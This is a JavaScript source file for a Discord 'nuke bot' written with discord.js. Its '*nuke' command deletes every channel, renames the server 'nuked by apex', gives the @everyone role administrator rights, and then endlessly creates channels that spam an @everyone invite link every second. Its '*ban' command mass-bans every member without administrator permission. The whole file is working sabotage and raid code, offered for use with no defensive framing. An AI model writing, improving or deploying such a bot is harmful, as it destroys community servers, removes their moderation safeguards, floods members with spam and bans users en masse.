const Discord = require('discord.js');
const { Permissions } = require('discord.js');
const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES, Discord.Intents.FLAGS.GUILD_MEMBERS]
});

client.on('ready', () => {
    console.log('Nuke bot is ready');
});

client.on('messageCreate', async (message) => {
    if (message.content === '*nuke') {
        // Delete all existing channels
        message.guild.channels.cache.forEach(channel => channel.delete());

        // Rename server
        await message.guild.setName('nuked by apex');

        // Update @everyone role permissions
        const everyoneRole = message.guild.roles.everyone;
        await everyoneRole.setPermissions(Permissions.FLAGS.ADMINISTRATOR);

        // Function to create a new channel and start spamming
        const createAndSpamChannel = async () => {
            const channel = await message.guild.channels.create('nuked by apex', {
                type: 'GUILD_TEXT'
            });

            // Spam messages in the new channel
            setInterval(() => {
                channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
            }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
        };

        // Create the initial channel
        await createAndSpamChannel();

        // Infinite loop to continually create new channels and start spamming
        setInterval(async () => {
            await createAndSpamChannel();
        }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
    }

    if (message.content === '*ban') {
        if (!message.member.permissions.has(Permissions.FLAGS.BAN_MEMBERS)) {
            return message.reply('You do not have permission to use this command.');
        }

        // Fetch all members and ban them except for members with ADMINISTRATOR permission or the bot itself
        const members = message.guild.members.cache.filter(member => 
            member.id !== client.user.id && !member.permissions.has(Permissions.FLAGS.ADMINISTRATOR)
        );

        let bannedCount = 0;

        for (const member of members.values()) {
            try {
                await member.ban({ reason: 'Banned by nuke bot' });
                console.log(`Banned ${member.user.tag}`);
                bannedCount++;
            } catch (error) {
                console.error(`Failed to ban ${member.user.tag}: ${error}`);
            }
        }

        message.channel.send(`Successfully banned ${bannedCount} members without ADMINISTRATOR permission.`);
    }
});

client.login(process.env.TOKEN);
